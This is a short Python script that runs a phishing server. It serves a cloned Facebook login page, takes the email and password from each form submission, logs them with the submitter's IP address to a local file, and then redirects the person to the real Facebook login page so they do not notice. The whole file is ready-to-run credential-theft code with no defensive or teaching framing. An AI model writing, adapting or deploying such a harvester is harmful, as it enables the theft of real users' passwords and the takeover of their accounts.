import http.server
import socketserver
import urllib.parse
import time
import os

# --- CONFIGURATION ---
PORT = 8000 # You can use 8080 if 8000 is blocked for some reason
# --- IMPORTANT: These fields are set for the 'melvincwng/facebook-clone' GitHub repository's index.html ---
USERNAME_FIELD_NAME = 'email'  # Confirmed from the provided index.html
PASSWORD_FIELD_NAME = 'pass'   # Confirmed from the provided index.html
# --- IMPORTANT: This is the REAL URL for Facebook login ---
REDIRECT_URL = 'http://www.facebook.com/login/'
# --- END CONFIGURATION ---

# Ensure the 'logs' directory exists
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)
LOG_FILE = os.path.join(LOG_DIR, "captured_credentials.txt")

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        # We only care about POST requests to our capture script URL (defined in index.html form action)
        if self.path == '/capture.php':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = urllib.parse.parse_qs(post_data)

            # Extract credentials using the configured field names
            username = parsed_data.get(USERNAME_FIELD_NAME, [''])[0]
            password = parsed_data.get(PASSWORD_FIELD_NAME, [''])[0]

            # Log the credentials
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] IP: {self.client_address[0]} - User: {username}, Pass: {password}\n"

            with open(LOG_FILE, "a") as f:
                f.write(log_entry)

            print(f"[+] Captured: User: {username}, Pass: {password} (Logged to {LOG_FILE})")

            # Redirect the "victim" to the legitimate site after logging
            self.send_response(302) # HTTP 302 Found (Redirection)
            self.send_header('Location', REDIRECT_URL)
            self.end_headers()
        else:
            # For any other POST request, act like a normal file server (unlikely in this simple setup)
            super().do_POST()

    def do_GET(self):
        # Serve index.html when the root URL is requested (e.g., http://localhost:8000/)
        if self.path == '/':
            self.path = '/index.html'
        # This handles serving CSS, JS, images, etc. from the cloned directory
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

# Start the server
# Start the server
with socketserver.TCPServer(("0.0.0.0", PORT), PhishingHandler) as httpd:
    print(f"[*] Starting phishing server on http://0.0.0.0:{PORT}")
    print(f"[*] Phishing page: http://0.0.0.0:{PORT}")
    print(f"[*] Captured credentials will be saved to: {LOG_FILE}")
    print("[*] Waiting for submissions... (Press Ctrl+C to stop)")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")

